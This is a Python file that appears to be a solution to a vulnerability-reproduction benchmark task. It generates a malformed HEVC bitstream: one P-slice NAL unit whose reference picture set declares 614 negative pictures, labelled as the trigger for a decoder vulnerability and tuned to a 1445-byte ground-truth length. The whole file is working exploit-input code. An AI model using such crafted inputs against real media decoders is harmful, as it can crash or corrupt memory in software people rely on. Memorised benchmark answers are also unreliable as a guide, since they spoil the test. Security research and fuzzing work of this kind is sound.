import struct

class Solution:
    """
    Generates a Proof-of-Concept (PoC) that triggers the vulnerability.
    """

    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        
        class BitstreamWriter:
            """A helper class to write bit-level data for an HEVC bitstream."""
            def __init__(self):
                self.buf = bytearray()
                self.current_byte = 0
                self.bit_pos = 0

            def write_bits(self, value: int, num_bits: int):
                for i in range(num_bits - 1, -1, -1):
                    bit = (value >> i) & 1
                    if bit:
                        self.current_byte |= (1 << (7 - self.bit_pos))
                    self.bit_pos += 1
                    if self.bit_pos == 8:
                        self.buf.append(self.current_byte)
                        self.current_byte = 0
                        self.bit_pos = 0

            def write_ue(self, value: int):
                """Writes a value using unsigned exponential-Golomb coding."""
                temp_val = value + 1
                num_bits = temp_val.bit_length()
                num_zeros = num_bits - 1
                self.write_bits(0, num_zeros)
                self.write_bits(temp_val, num_bits)

            def get_payload(self) -> bytes:
                """Finalizes the bitstream with RBSP trailing bits and returns the byte payload."""
                # rbsp_stop_one_bit
                self.write_bits(1, 1)
                # rbsp_alignment_zero_bit
                if self.bit_pos != 0:
                    self.write_bits(0, 8 - self.bit_pos)
                return bytes(self.buf)

        def nalu(nalu_type: int, payload: bytes) -> bytes:
            """Constructs a full NAL unit with a start code and header."""
            start_code = b'\x00\x00\x00\x01'
            # NAL unit header (2 bytes)
            # forbidden_zero_bit: 0 | nal_unit_type: 6 bits | nuh_layer_id: 6 bits | nuh_temporal_id_plus1: 3 bits
            header_byte1 = nalu_type << 1
            header_byte2 = 1  # nuh_layer_id=0, nuh_temporal_id_plus1=1
            header = struct.pack('>BB', header_byte1, header_byte2)
            return start_code + header + payload

        # This value is tuned to achieve a PoC size close to the ground-truth length of 1445 bytes.
        NUM_REF_PICS = 614

        bw = BitstreamWriter()

        # --- slice_segment_header ---
        # The PoC consists of a single P-slice NAL unit. It assumes the decoder has a default
        # or pre-existing context (VPS/SPS/PPS), which is common in stream parsing.
        bw.write_bits(1, 1)   # first_slice_segment_in_pic_flag
        bw.write_ue(0)        # slice_pic_parameter_set_id
        bw.write_bits(0, 2)   # slice_segment_address
        bw.write_ue(1)        # slice_type = P_SLICE
        bw.write_bits(1, 1)   # pic_output_flag
        bw.write_bits(0, 8)   # slice_pic_order_cnt_lsb
        bw.write_bits(0, 1)   # short_term_ref_pic_set_sps_flag = 0

        # --- short_term_ref_pic_set() ---
        # This structure is defined directly in the slice header and contains the malicious values.
        bw.write_bits(0, 1)   # inter_ref_pic_set_prediction_flag
        bw.write_ue(NUM_REF_PICS)  # num_negative_pics - THE VULNERABILITY TRIGGER
        bw.write_ue(0)        # num_positive_pics

        # Loop to provide plausible data for each declared negative reference picture.
        # This is necessary to get past the initial parsing stages before the vulnerability is triggered.
        for i in range(NUM_REF_PICS):
            bw.write_ue(i)      # delta_poc_s0_minus1[i]
            bw.write_bits(1, 1) # used_by_curr_pic_s0_flag[i]
        
        # Additional slice header flags to make the bitstream more realistic and ensure it parses
        # far enough to reach the vulnerable function.
        bw.write_bits(0, 1)   # num_ref_idx_active_override_flag
        bw.write_bits(0, 1)   # ref_pic_lists_modification_flag_l0
        bw.write_bits(0, 1)   # ref_pic_lists_modification_flag_l1
        bw.write_bits(0, 1)   # mvd_l1_zero_flag
        bw.write_bits(0, 1)   # cabac_init_flag
        bw.write_bits(0, 1)   # slice_temporal_mvp_enabled_flag
        bw.write_bits(0, 1)   # deblocking_filter_override_flag
        bw.write_bits(0, 1)   # slice_sao_luma_flag
        bw.write_bits(0, 1)   # slice_sao_chroma_flag
        bw.write_bits(0, 1)   # slice_loop_filter_across_slices_enabled_flag

        slice_payload = bw.get_payload()

        # NALU Type 1 = Coded slice of a non-IDR picture
        poc = nalu(1, slice_payload)

        return poc